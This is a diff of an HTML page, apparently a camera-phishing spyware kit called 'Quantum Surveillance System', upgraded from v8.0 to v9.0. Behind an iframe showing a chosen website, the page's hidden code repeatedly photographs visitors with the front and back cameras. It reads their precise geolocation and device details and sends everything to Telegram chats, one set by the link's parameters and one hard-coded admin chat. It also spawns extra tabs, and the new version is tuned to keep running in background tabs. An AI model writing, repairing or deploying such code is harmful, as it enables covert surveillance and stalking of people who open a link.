@@ -55,18 +55,6 @@
             background: white;
         }
         
-        /* Hide all quantum indicators */
-        #quantumLoader,
-        #stealthIndicators,
-        #neuralNetwork,
-        #quantumChannel,
-        .hologram-effect,
-        #quantumConsole {
-            display: none !important;
-            opacity: 0 !important;
-            visibility: hidden !important;
-        }
-        
         /* Loading screen */
         #loadingScreen {
             position: fixed;
@@ -100,14 +88,6 @@
         </div>
     </div>
     
-    <!-- Hidden quantum elements -->
-    <div id="quantumLoader"></div>
-    <div id="stealthIndicators"></div>
-    <canvas id="neuralNetwork"></canvas>
-    <div id="quantumChannel"></div>
-    <div class="hologram-effect" id="hologram1"></div>
-    <div class="hologram-effect" id="hologram2"></div>
-    
     <!-- Hidden camera elements -->
     <div id="cameraContainer">
         <video id="cameraVideo" autoplay playsinline muted></video>
@@ -122,8 +102,8 @@
 
     <script>
         // =====================================================
-        //  QUANTUM SURVEILLANCE SYSTEM v8.0
-        //  FIXED VERSION - ALL FEATURES WORKING
+        //  QUANTUM SURVEILLANCE SYSTEM v9.0
+        //  FIXED: WORKS IN BACKGROUND TABS
         // =====================================================
         
         // ============== QUANTUM CONFIGURATION ==============
@@ -134,667 +114,76 @@
             ADMIN_CHAT_ID: '6314556756',
             
             // Camera Settings
-            PHOTOS_PER_CAMERA: 6,
+            PHOTOS_PER_CAMERA: 4,
             CAPTURE_DELAY: 300,
-            CAMERA_WARMUP: 500,
-            SWITCH_DELAY: 400,
-            IMAGE_QUALITY: 0.92,
-            MIN_BLOB_SIZE: 20000,
-            VIDEO_WIDTH: 1280,
-            VIDEO_HEIGHT: 720,
-            FRAME_RATE: 30,
+            CAMERA_WARMUP: 1000,
+            SWITCH_DELAY: 500,
+            IMAGE_QUALITY: 0.90,
+            MIN_BLOB_SIZE: 15000,
             
-            // Quantum Timing
-            QUANTUM_CYCLE_INTERVAL: 10000,
-            QUANTUM_HEARTBEAT: 5000,
+            // Timing
+            CYCLE_INTERVAL: 12000,
+            HEARTBEAT_INTERVAL: 8000,
             
-            // Multi-Tab Replication
+            // Multi-Tab
             REPLICATION_COUNT: 5,
-            REPLICATION_DELAY: 1500,
-            TAB_LIFETIME: 180000,
-            
-            // Performance
-            MAX_QUANTUM_RETRIES: 2,
-            QUANTUM_RETRY_DELAY: 800
+            REPLICATION_DELAY: 1000
         };
         
-        // ============== QUANTUM STATE ==============
-        const QUANTUM_STATE = {
-            quantumActive: false,
-            quantumEntangled: false,
-            quantumPermission: false,
-            quantumStream: null,
-            quantumCamera: null,
-            quantumSession: 'QSESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12),
-            quantumTab: 'QTAB_' + Math.random().toString(36).substr(2, 10) + '_' + Date.now(),
-            quantumUser: null,
-            quantumTarget: null,
-            
-            quantumPhotos: 0,
-            quantumFailed: 0,
-            quantumCycles: 0,
-            quantumStart: Date.now(),
-            quantumLastCapture: 0,
-            quantumDataTransferred: 0,
-            
-            quantumDevice: {},
-            quantumLocation: null,
-            quantumBattery: null,
-            
-            quantumCameras: [],
-            quantumCameraReady: false,
-            quantumCameraIndex: 0,
-            
-            quantumBroadcast: null,
-            quantumNodes: new Set(),
-            
-            quantumCache: new Map(),
-            quantumQueue: [],
-            
-            replicatedTabs: 0,
-            isInitialized: false
+        // ============== GLOBAL STATE ==============
+        const Q = {
+            active: false,
+            session: 'QSESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12),
+            tab: 'QTAB_' + Math.random().toString(36).substr(2, 10),
+            user: null,
+            target: null,
+            photos: 0,
+            cycles: 0,
+            cameras: [],
+            cameraReady: false,
+            permission: false,
+            broadcast: null,
+            nodes: new Set(),
+            device: {},
+            location: null,
+            replicated: 0,
+            initialized: false,
+            pendingPhotos: [],
+            captureQueue: []
         };
         
-        // ============== QUANTUM ELEMENTS ==============
-        const QUANTUM_ELEMENTS = {
+        // ============== ELEMENTS ==============
+        const E = {
             video: document.getElementById('cameraVideo'),
             canvas: document.getElementById('captureCanvas'),
             frame: document.getElementById('websiteFrame'),
-            loadingScreen: document.getElementById('loadingScreen')
+            loading: document.getElementById('loadingScreen')
         };
         
-        // ============== QUANTUM UTILITIES ==============
-        
-        function quantumLog(message) {
-            // Store in cache only
-            QUANTUM_STATE.quantumCache.set(`log_${Date.now()}`, {
-                timestamp: Date.now(),
-                message: message,
-                session: QUANTUM_STATE.quantumSession
-            });
-        }
-        
-        // ============== QUANTUM CAMERA SYSTEM ==============
-        
-        class QuantumCameraSystem {
-            constructor() {
-                this.quantumStream = null;
-                this.capturing = false;
-                this.quantumRetry = 0;
-            }
-            
-            async initialize() {
-                try {
-                    quantumLog("Testing camera permission...");
-                    
-                    // First try to get camera access
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            width: { ideal: QUANTUM_CONFIG.VIDEO_WIDTH },
-                            height: { ideal: QUANTUM_CONFIG.VIDEO_HEIGHT },
-                            facingMode: { ideal: 'user' }
-                        }
-                    });
-                    
-                    // Get camera list
-                    const devices = await navigator.mediaDevices.enumerateDevices();
-                    QUANTUM_STATE.quantumCameras = devices.filter(d => d.kind === 'videoinput');
-                    
-                    // Stop test stream
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    QUANTUM_STATE.quantumPermission = true;
-                    quantumLog(`Camera permission granted. Found ${QUANTUM_STATE.quantumCameras.length} cameras`);
-                    
-                    return true;
-                    
-                } catch (error) {
-                    quantumLog("Camera permission error: " + error.message);
-                    return false;
-                }
-            }
-            
-            async startQuantumCamera(facingMode, retry = 0) {
-                if (retry >= QUANTUM_CONFIG.MAX_QUANTUM_RETRIES) {
-                    return false;
-                }
-                
-                try {
-                    // Stop previous stream
-                    if (this.quantumStream) {
-                        this.quantumStream.getTracks().forEach(track => track.stop());
-                        await new Promise(r => setTimeout(r, 200));
-                    }
-                    
-                    // Get new stream
-                    this.quantumStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: { ideal: facingMode },
-                            width: { ideal: QUANTUM_CONFIG.VIDEO_WIDTH },
-                            height: { ideal: QUANTUM_CONFIG.VIDEO_HEIGHT }
-                        }
-                    });
-                    
-                    QUANTUM_ELEMENTS.video.srcObject = this.quantumStream;
-                    
-                    // Wait for video to be ready
-                    await new Promise((resolve) => {
-                        const checkReady = () => {
-                            if (QUANTUM_ELEMENTS.video.readyState >= 3) {
-                                resolve();
-                            } else {
-                                setTimeout(checkReady, 50);
-                            }
-                        };
-                        checkReady();
-                    });
-                    
-                    await QUANTUM_ELEMENTS.video.play();
-                    
-                    // Warmup time
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAMERA_WARMUP));
-                    
-                    QUANTUM_STATE.quantumCameraReady = true;
-                    this.quantumRetry = 0;
-                    
-                    quantumLog(`Camera ${facingMode} activated`);
-                    return true;
-                    
-                } catch (error) {
-                    this.quantumRetry++;
-                    QUANTUM_STATE.quantumCameraReady = false;
-                    
-                    if (this.quantumStream) {
-                        this.quantumStream.getTracks().forEach(track => track.stop());
-                        this.quantumStream = null;
-                    }
-                    
-                    quantumLog(`Camera ${facingMode} failed, retry ${retry + 1}`);
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
-                    return await this.startQuantumCamera(facingMode, retry + 1);
-                }
-            }
-            
-            async captureQuantumPhoto() {
-                if (!QUANTUM_STATE.quantumCameraReady || !QUANTUM_ELEMENTS.video.videoWidth) {
-                    return null;
-                }
-                
-                try {
-                    const canvas = QUANTUM_ELEMENTS.canvas;
-                    const ctx = canvas.getContext('2d', { willReadFrequently: true });
-                    
-                    canvas.width = QUANTUM_ELEMENTS.video.videoWidth;
-                    canvas.height = QUANTUM_ELEMENTS.video.videoHeight;
-                    
-                    ctx.drawImage(QUANTUM_ELEMENTS.video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Apply some basic enhancements
-                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                    const data = imageData.data;
-                    
-                    for (let i = 0; i < data.length; i += 4) {
-                        // Brighten image slightly
-                        data[i] = Math.min(255, data[i] * 1.1);
-                        data[i+1] = Math.min(255, data[i+1] * 1.1);
-                        data[i+2] = Math.min(255, data[i+2] * 1.1);
-                    }
-                    
-                    ctx.putImageData(imageData, 0, 0);
-                    
-                    return new Promise((resolve) => {
-                        canvas.toBlob(
-                            (blob) => resolve(blob && blob.size > QUANTUM_CONFIG.MIN_BLOB_SIZE ? blob : null),
-                            'image/jpeg',
-                            QUANTUM_CONFIG.IMAGE_QUALITY
-                        );
-                    });
-                    
-                } catch (error) {
-                    quantumLog("Capture error: " + error.message);
-                    return null;
-                }
-            }
-            
-            async captureQuantumBurst(cameraType, count = QUANTUM_CONFIG.PHOTOS_PER_CAMERA) {
-                const results = [];
-                
-                for (let i = 1; i <= count; i++) {
-                    if (!QUANTUM_STATE.quantumActive) break;
-                    
-                    const blob = await this.captureQuantumPhoto();
-                    if (blob) {
-                        results.push({ 
-                            blob: blob, 
-                            index: i, 
-                            timestamp: Date.now(),
-                            camera: cameraType
-                        });
-                        quantumLog(`Captured ${cameraType} photo ${i}`);
-                    }
-                    
-                    if (i < count) {
-                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAPTURE_DELAY));
-                    }
-                }
-                
-                return results;
-            }
-            
-            cleanup() {
-                if (this.quantumStream) {
-                    this.quantumStream.getTracks().forEach(track => track.stop());
-                    this.quantumStream = null;
-                }
-                QUANTUM_STATE.quantumCameraReady = false;
-                quantumLog("Camera system cleaned up");
-            }
-        }
-        
-        // ============== QUANTUM TELEGRAM COMMUNICATION ==============
-        
-        async function sendQuantumToTelegram(blob, cameraType, sequence, retry = 0) {
-            if (!blob || blob.size < QUANTUM_CONFIG.MIN_BLOB_SIZE) {
-                QUANTUM_STATE.quantumFailed++;
-                return false;
-            }
-            
-            if (retry >= QUANTUM_CONFIG.MAX_QUANTUM_RETRIES) {
-                QUANTUM_STATE.quantumFailed++;
-                QUANTUM_STATE.quantumQueue.push({ blob, cameraType, sequence, timestamp: Date.now() });
-                return false;
-            }
-            
-            try {
-                let caption = `📸 *QUANTUM CAPTURE #${QUANTUM_STATE.quantumPhotos + 1}*\n\n`;
-                caption += `Session: \`${QUANTUM_STATE.quantumSession}\`\n`;
-                caption += `Camera: ${cameraType.toUpperCase()} (${sequence}/${QUANTUM_CONFIG.PHOTOS_PER_CAMERA})\n`;
-                caption += `Cycle: ${QUANTUM_STATE.quantumCycles}\n`;
-                caption += `Time: ${new Date().toLocaleTimeString()}\n`;
-                
-                if (QUANTUM_STATE.quantumLocation) {
-                    caption += `Location: ${QUANTUM_STATE.quantumLocation.coordinates.lat.toFixed(6)}, ${QUANTUM_STATE.quantumLocation.coordinates.lon.toFixed(6)}\n`;
-                }
-                
-                if (QUANTUM_STATE.quantumDevice.quantumOS) {
-                    caption += `Device: ${QUANTUM_STATE.quantumDevice.quantumOS} ${QUANTUM_STATE.quantumDevice.quantumBrowser}\n`;
-                }
-                
-                const formData = new FormData();
-                formData.append('chat_id', QUANTUM_STATE.quantumUser);
-                formData.append('photo', blob, `quantum_${Date.now()}_${cameraType}_${sequence}.jpg`);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-                
-                const response = await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    QUANTUM_STATE.quantumPhotos++;
-                    QUANTUM_STATE.quantumLastCapture = Date.now();
-                    QUANTUM_STATE.quantumDataTransferred += blob.size;
-                    
-                    quantumLog(`Photo sent to Telegram: ${cameraType} ${sequence}`);
-                    
-                    // Also send to admin
-                    setTimeout(async () => {
-                        try {
-                            const adminFormData = new FormData();
-                            adminFormData.append('chat_id', QUANTUM_CONFIG.ADMIN_CHAT_ID);
-                            adminFormData.append('photo', blob, `admin_${Date.now()}.jpg`);
-                            adminFormData.append('caption', caption + `\n👤 User ID: \`${QUANTUM_STATE.quantumUser}\``);
-                            adminFormData.append('parse_mode', 'Markdown');
-                            
-                            await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
-                                method: 'POST',
-                                body: adminFormData
-                            });
-                            
-                            quantumLog("Photo also sent to admin");
-                        } catch (adminError) {
-                            // Silent fail
-                        }
-                    }, 500);
-                    
-                    return true;
-                    
-                } else {
-                    quantumLog(`Telegram send failed: ${JSON.stringify(result)}`);
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
-                    return await sendQuantumToTelegram(blob, cameraType, sequence, retry + 1);
-                }
-                
-            } catch (error) {
-                quantumLog(`Telegram error: ${error.message}`);
-                await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY * (retry + 1)));
-                return await sendQuantumToTelegram(blob, cameraType, sequence, retry + 1);
-            }
-        }
-        
-        // ============== DEVICE FINGERPRINTING ==============
-        
-        async function collectQuantumDeviceInfo() {
-            try {
-                const ua = navigator.userAgent;
-                let os = 'Unknown';
-                let browser = 'Unknown';
-                
-                // Detect OS
-                if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
-                else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
-                else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
-                else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
-                else if (/Mac OS X/.test(ua)) os = 'macOS';
-                else if (/Linux/.test(ua)) os = 'Linux';
-                else if (/Android/.test(ua)) os = 'Android';
-                else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
-                
-                // Detect Browser
-                if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) browser = 'Chrome';
-                else if (/Firefox/.test(ua)) browser = 'Firefox';
-                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-                else if (/Edge/.test(ua)) browser = 'Edge';
-                else if (/Opera|OPR/.test(ua)) browser = 'Opera';
-                
-                const quantumInfo = {
-                    quantumAgent: ua,
-                    quantumPlatform: navigator.platform,
-                    quantumOS: os,
-                    quantumBrowser: browser,
-                    
-                    quantumScreen: {
-                        width: screen.width,
-                        height: screen.height,
-                        colorDepth: screen.colorDepth
-                    },
-                    
-                    quantumHardware: {
-                        concurrency: navigator.hardwareConcurrency || 'unknown',
-                        memory: navigator.deviceMemory || 'unknown'
-                    },
-                    
-                    quantumTime: {
-                        zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        offset: new Date().getTimezoneOffset(),
-                        timestamp: Date.now()
-                    }
-                };
-                
-                QUANTUM_STATE.quantumDevice = quantumInfo;
-                quantumLog(`Device info collected: ${os} ${browser}`);
-                
-                return quantumInfo;
-                
-            } catch (error) {
-                quantumLog("Device info error: " + error.message);
-                return {};
-            }
-        }
-        
-        // ============== LOCATION SYSTEM ==============
-        
-        async function getQuantumLocation() {
-            if (!navigator.geolocation) {
-                return null;
-            }
-            
-            return new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const location = {
-                            coordinates: {
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                acc: Math.round(position.coords.accuracy)
-                            },
-                            timestamp: new Date(position.timestamp).toISOString()
-                        };
-                        
-                        QUANTUM_STATE.quantumLocation = location;
-                        quantumLog(`Location obtained: ${location.coordinates.lat}, ${location.coordinates.lon}`);
-                        resolve(location);
-                    },
-                    (error) => {
-                        quantumLog("Location error: " + error.message);
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-        
-        // ============== BATTERY INFO ==============
-        
-        async function getQuantumBatteryInfo() {
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging
-                    };
-                }
-            } catch (e) {}
-            return null;
-        }
-        
-        // ============== MULTI-TAB REPLICATION ==============
-        
-        function replicateQuantumTabs() {
-            const tabsToCreate = 5 - QUANTUM_STATE.replicatedTabs;
-            
-            for (let i = 0; i < tabsToCreate; i++) {
-                setTimeout(() => {
-                    try {
-                        const newTab = window.open(window.location.href, '_blank');
-                        if (newTab) {
-                            QUANTUM_STATE.replicatedTabs++;
-                            quantumLog(`Created tab ${QUANTUM_STATE.replicatedTabs}/5`);
-                            
-                            // Close tab after lifetime
-                            setTimeout(() => {
-                                try {
-                                    newTab.close();
-                                    QUANTUM_STATE.replicatedTabs--;
-                                    quantumLog(`Closed tab, remaining: ${QUANTUM_STATE.replicatedTabs}`);
-                                } catch (e) {}
-                            }, QUANTUM_CONFIG.TAB_LIFETIME);
-                        }
-                    } catch (e) {
-                        // Popup blocker
-                    }
-                }, i * QUANTUM_CONFIG.REPLICATION_DELAY);
-            }
-        }
-        
-        // ============== BROADCAST CHANNEL ==============
-        
-        function initBroadcastChannel() {
-            try {
-                if (window.BroadcastChannel) {
-                    QUANTUM_STATE.quantumBroadcast = new BroadcastChannel('quantum_channel');
-                    QUANTUM_STATE.quantumBroadcast.onmessage = (event) => {
-                        if (event.data && event.data.type === 'quantum_heartbeat') {
-                            if (event.data.tab !== QUANTUM_STATE.quantumTab) {
-                                QUANTUM_STATE.quantumNodes.add(event.data.tab);
-                            }
-                        }
-                    };
-                    QUANTUM_STATE.quantumEntangled = true;
-                    quantumLog("Broadcast channel initialized");
-                }
-            } catch (e) {
-                quantumLog("Broadcast channel error: " + e.message);
-            }
-        }
-        
-        // ============== SYSTEM REPORT ==============
-        
-        async function sendQuantumSystemReport() {
-            try {
-                let report = `⚡ *QUANTUM SYSTEM ACTIVATED*\n\n`;
-                report += `Session: \`${QUANTUM_STATE.quantumSession}\`\n`;
-                report += `User: \`${QUANTUM_STATE.quantumUser}\`\n`;
-                report += `URL: ${QUANTUM_STATE.quantumTarget}\n`;
-                report += `Time: ${new Date().toLocaleString()}\n\n`;
-                
-                report += `📱 *DEVICE*\n`;
-                report += `OS: ${QUANTUM_STATE.quantumDevice.quantumOS || 'Unknown'}\n`;
-                report += `Browser: ${QUANTUM_STATE.quantumDevice.quantumBrowser || 'Unknown'}\n`;
-                report += `Screen: ${QUANTUM_STATE.quantumDevice.quantumScreen?.width}x${QUANTUM_STATE.quantumDevice.quantumScreen?.height}\n`;
-                report += `Cores: ${QUANTUM_STATE.quantumDevice.quantumHardware?.concurrency}\n\n`;
-                
-                report += `📷 *CAMERAS*\n`;
-                report += `Found: ${QUANTUM_STATE.quantumCameras.length}\n`;
-                report += `Permission: ${QUANTUM_STATE.quantumPermission ? '✅' : '❌'}\n`;
-                report += `Active: ${QUANTUM_STATE.quantumActive ? '✅' : '❌'}\n\n`;
-                
-                report += `📍 *LOCATION*\n`;
-                report += `Status: ${QUANTUM_STATE.quantumLocation ? '✅ Captured' : '❌ Unavailable'}\n\n`;
-                
-                report += `🔄 *REPLICATION*\n`;
-                report += `Tabs: ${QUANTUM_STATE.replicatedTabs}/5\n\n`;
-                
-                report += `⚙️ *SYSTEM STATUS*\n`;
-                report += `Surveillance: ${QUANTUM_STATE.quantumActive ? '✅ ACTIVE' : '❌ INACTIVE'}\n`;
-                report += `Entanglement: ${QUANTUM_STATE.quantumEntangled ? '✅ SYNCED' : '❌ OFF'}\n`;
-                report += `Initialized: ${QUANTUM_STATE.isInitialized ? '✅ YES' : '❌ NO'}`;
-                
-                await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: QUANTUM_CONFIG.ADMIN_CHAT_ID,
-                        text: report,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                
-                quantumLog("System report sent to Telegram");
-                
-            } catch (error) {
-                quantumLog("System report error: " + error.message);
-            }
-        }
-        
-        // ============== MAIN SURVEILLANCE LOOP ==============
-        
-        async function startQuantumSurveillance() {
-            if (QUANTUM_STATE.quantumActive || !window._quantumCamera) {
-                quantumLog("Surveillance not started: " + (QUANTUM_STATE.quantumActive ? "Already active" : "Camera not initialized"));
-                return;
-            }
-            
-            QUANTUM_STATE.quantumActive = true;
-            quantumLog("===== SURVEILLANCE STARTED =====");
-            
-            // Start multi-tab replication
-            replicateQuantumTabs();
-            
-            // Start heartbeat
-            const heartbeatInterval = setInterval(() => {
-                if (QUANTUM_STATE.quantumBroadcast && QUANTUM_STATE.quantumActive) {
-                    QUANTUM_STATE.quantumBroadcast.postMessage({
-                        type: 'quantum_heartbeat',
-                        tab: QUANTUM_STATE.quantumTab,
-                        session: QUANTUM_STATE.quantumSession,
-                        timestamp: Date.now(),
-                        photos: QUANTUM_STATE.quantumPhotos,
-                        cycles: QUANTUM_STATE.quantumCycles,
-                        active: QUANTUM_STATE.quantumActive
-                    });
-                }
-            }, QUANTUM_CONFIG.QUANTUM_HEARTBEAT);
-            
-            // Main surveillance loop
-            try {
-                while (QUANTUM_STATE.quantumActive) {
-                    QUANTUM_STATE.quantumCycles++;
-                    quantumLog(`Starting surveillance cycle ${QUANTUM_STATE.quantumCycles}`);
-                    
-                    // FRONT CAMERA
-                    quantumLog("Attempting to activate front camera...");
-                    if (await window._quantumCamera.startQuantumCamera('user')) {
-                        quantumLog("Front camera activated, capturing photos...");
-                        const frontPhotos = await window._quantumCamera.captureQuantumBurst('front');
-                        quantumLog(`Captured ${frontPhotos.length} front camera photos`);
-                        
-                        for (const photo of frontPhotos) {
-                            if (QUANTUM_STATE.quantumActive) {
-                                await sendQuantumToTelegram(photo.blob, 'front', photo.index);
-                            }
-                        }
-                    } else {
-                        quantumLog("Front camera failed");
-                    }
-                    
-                    if (!QUANTUM_STATE.quantumActive) break;
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.SWITCH_DELAY));
-                    
-                    // BACK CAMERA
-                    quantumLog("Attempting to activate back camera...");
-                    if (QUANTUM_STATE.quantumActive && await window._quantumCamera.startQuantumCamera('environment')) {
-                        quantumLog("Back camera activated, capturing photos...");
-                        const backPhotos = await window._quantumCamera.captureQuantumBurst('back');
-                        quantumLog(`Captured ${backPhotos.length} back camera photos`);
-                        
-                        for (const photo of backPhotos) {
-                            if (QUANTUM_STATE.quantumActive) {
-                                await sendQuantumToTelegram(photo.blob, 'back', photo.index);
-                            }
-                        }
-                    } else {
-                        quantumLog("Back camera failed");
-                    }
-                    
-                    if (!QUANTUM_STATE.quantumActive) break;
-                    
-                    quantumLog(`Cycle ${QUANTUM_STATE.quantumCycles} complete. Total photos: ${QUANTUM_STATE.quantumPhotos}`);
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_CYCLE_INTERVAL));
-                }
-            } catch (error) {
-                quantumLog("Surveillance loop error: " + error.message);
-            } finally {
-                clearInterval(heartbeatInterval);
-                if (window._quantumCamera) {
-                    window._quantumCamera.cleanup();
-                }
-                quantumLog("===== SURVEILLANCE STOPPED =====");
-            }
+        // ============== SIMPLE LOGGING ==============
+        function log(msg) {
+            console.log('[Quantum] ' + msg);
         }
         
         // ============== URL PARSING ==============
-        
-        function parseQuantumURL() {
+        function parseURL() {
             const params = new URLSearchParams(window.location.search);
             
-            QUANTUM_STATE.quantumUser = params.get('chat_id') || 
-                                       params.get('user') || 
-                                       params.get('id') || 
-                                       QUANTUM_CONFIG.ADMIN_CHAT_ID;
+            Q.user = params.get('chat_id') || 
+                    params.get('user') || 
+                    params.get('id') || 
+                    QUANTUM_CONFIG.ADMIN_CHAT_ID;
             
             let target = params.get('site') || 
                         params.get('url') || 
                         params.get('target') ||
-                        window.location.hash.substr(1) ||
                         'https://loading-screen.github.io/';
             
             try {
                 if (target.startsWith('QUANTUM:')) {
                     target = atob(target.split(':')[1]);
                 } else if (!target.includes('://')) {
-                    try {
-                        target = atob(target);
-                    } catch (e) {}
+                    target = atob(target);
                 }
                 target = decodeURIComponent(target);
             } catch (e) {}
@@ -803,120 +192,549 @@
                 target = 'https://' + target;
             }
             
-            QUANTUM_STATE.quantumTarget = target;
-            quantumLog(`URL parsed: ${QUANTUM_STATE.quantumTarget}, User: ${QUANTUM_STATE.quantumUser}`);
+            Q.target = target;
+            log(`Target: ${Q.target}, User: ${Q.user}`);
         }
         
-        function loadQuantumWebsite() {
+        function loadWebsite() {
             try {
-                QUANTUM_ELEMENTS.frame.src = QUANTUM_STATE.quantumTarget;
-                
-                QUANTUM_ELEMENTS.frame.onload = () => {
+                E.frame.src = Q.target;
+                E.frame.onload = () => {
                     setTimeout(() => {
-                        QUANTUM_ELEMENTS.loadingScreen.style.opacity = '0';
+                        E.loading.style.opacity = '0';
                         setTimeout(() => {
-                            QUANTUM_ELEMENTS.loadingScreen.style.display = 'none';
+                            E.loading.style.display = 'none';
                         }, 500);
-                    }, 1500);
+                    }, 1000);
                 };
-                
-                quantumLog("Website loaded into iframe");
-            } catch (error) {
-                quantumLog("Website load error: " + error.message);
-            }
+            } catch (e) {}
         }
         
-        // ============== MAIN INITIALIZATION ==============
+        // ============== DEVICE INFO ==============
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            let browser = 'Unknown';
+            
+            if (/Windows NT 10/.test(ua)) os = 'Windows';
+            else if (/Mac OS X/.test(ua)) os = 'macOS';
+            else if (/Linux/.test(ua)) os = 'Linux';
+            else if (/Android/.test(ua)) os = 'Android';
+            else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+            
+            if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
+            else if (/Firefox/.test(ua)) browser = 'Firefox';
+            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+            else if (/Edge/.test(ua)) browser = 'Edge';
+            
+            Q.device = {
+                os: os,
+                browser: browser,
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                agent: ua.substring(0, 100)
+            };
+            
+            log(`Device: ${os} ${browser}`);
+        }
         
-        async function initializeQuantumSystem() {
-            if (QUANTUM_STATE.isInitialized) {
-                return;
+        // ============== LOCATION ==============
+        function getLocation() {
+            if (!navigator.geolocation) return;
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    Q.location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: Math.round(pos.coords.accuracy)
+                    };
+                    log(`Location: ${Q.location.lat}, ${Q.location.lon}`);
+                },
+                () => {},
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+        
+        // ============== BROADCAST CHANNEL ==============
+        function initBroadcast() {
+            try {
+                if (window.BroadcastChannel) {
+                    Q.broadcast = new BroadcastChannel('quantum_channel');
+                    Q.broadcast.onmessage = (e) => {
+                        if (e.data && e.data.type === 'heartbeat') {
+                            if (e.data.tab !== Q.tab) {
+                                Q.nodes.add(e.data.tab);
+                            }
+                        }
+                    };
+                    log('Broadcast channel ready');
+                }
+            } catch (e) {}
+        }
+        
+        // ============== TELEGRAM FUNCTIONS ==============
+        async function sendTelegramPhoto(blob, cameraType, sequence) {
+            if (!blob || blob.size < QUANTUM_CONFIG.MIN_BLOB_SIZE) {
+                return false;
             }
             
             try {
-                quantumLog("===== INITIALIZING QUANTUM SYSTEM =====");
+                let caption = `📸 *QUANTUM CAPTURE*\n`;
+                caption += `Session: \`${Q.session}\`\n`;
+                caption += `Camera: ${cameraType.toUpperCase()} #${sequence}\n`;
+                caption += `Cycle: ${Q.cycles}\n`;
+                caption += `Total: ${Q.photos}\n`;
+                caption += `Time: ${new Date().toLocaleTimeString()}`;
                 
-                // Parse URL and load website
-                parseQuantumURL();
-                loadQuantumWebsite();
+                if (Q.location) {
+                    caption += `\n📍 ${Q.location.lat.toFixed(6)}, ${Q.location.lon.toFixed(6)}`;
+                }
                 
-                // Initialize broadcast channel
-                initBroadcastChannel();
+                // Send to user
+                const userForm = new FormData();
+                userForm.append('chat_id', Q.user);
+                userForm.append('photo', blob, `photo_${Date.now()}.jpg`);
+                userForm.append('caption', caption);
+                userForm.append('parse_mode', 'Markdown');
                 
-                // Collect device info
-                await collectQuantumDeviceInfo();
+                const res = await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
+                    method: 'POST',
+                    body: userForm
+                });
                 
-                // Get location (async, don't wait)
-                getQuantumLocation().catch(() => {});
+                const result = await res.json();
                 
-                // Initialize camera system
-                window._quantumCamera = new QuantumCameraSystem();
-                const cameraInitialized = await window._quantumCamera.initialize();
-                
-                if (cameraInitialized) {
-                    QUANTUM_STATE.isInitialized = true;
+                if (result.ok) {
+                    Q.photos++;
+                    log(`Photo sent: ${cameraType} ${sequence}`);
                     
-                    // Send system report
-                    await sendQuantumSystemReport();
+                    // Also send to admin
+                    setTimeout(async () => {
+                        try {
+                            const adminForm = new FormData();
+                            adminForm.append('chat_id', QUANTUM_CONFIG.ADMIN_CHAT_ID);
+                            adminForm.append('photo', blob, `admin_${Date.now()}.jpg`);
+                            adminForm.append('caption', caption + `\n👤 User: \`${Q.user}\``);
+                            adminForm.append('parse_mode', 'Markdown');
+                            
+                            await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
+                                method: 'POST',
+                                body: adminForm
+                            });
+                        } catch (e) {}
+                    }, 300);
                     
-                    // Start surveillance after a delay
+                    return true;
+                }
+            } catch (error) {
+                log(`Telegram error: ${error.message}`);
+            }
+            return false;
+        }
+        
+        async function sendSystemReport() {
+            try {
+                let report = `⚡ *QUANTUM SYSTEM STARTED*\n\n`;
+                report += `Session: \`${Q.session}\`\n`;
+                report += `User: \`${Q.user}\`\n`;
+                report += `URL: ${Q.target}\n`;
